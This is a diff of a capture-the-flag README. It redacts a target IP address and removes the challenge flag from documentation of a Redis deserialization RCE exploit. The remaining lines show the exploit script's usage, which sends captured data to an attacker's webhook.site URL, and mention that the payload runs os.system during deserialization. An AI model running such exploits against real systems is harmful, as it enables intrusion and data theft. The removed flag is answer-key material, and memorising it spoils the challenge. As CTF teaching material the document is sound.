@@ -65,7 +65,7 @@ Execute arbitrary code and send flag to YOUR webhook (private).
 
 ```bash
 python exploit_rce_webhook.py <target_ip> <your_webhook_url>
-python exploit_rce_webhook.py 129.212.236.27 https://webhook.site/your-id
+python exploit_rce_webhook.py <target_ip> https://webhook.site/your-id
 ```
 
 **Payload:**
@@ -104,10 +104,4 @@ This executes `os.system("whoami")` during deserialization!
 
 ```bash
 pip install redis requests
-```
-
-## Flag
-
-```
-BUETCTF{r3d15_541d_7ru57_m3_br0_T_T}
 ```
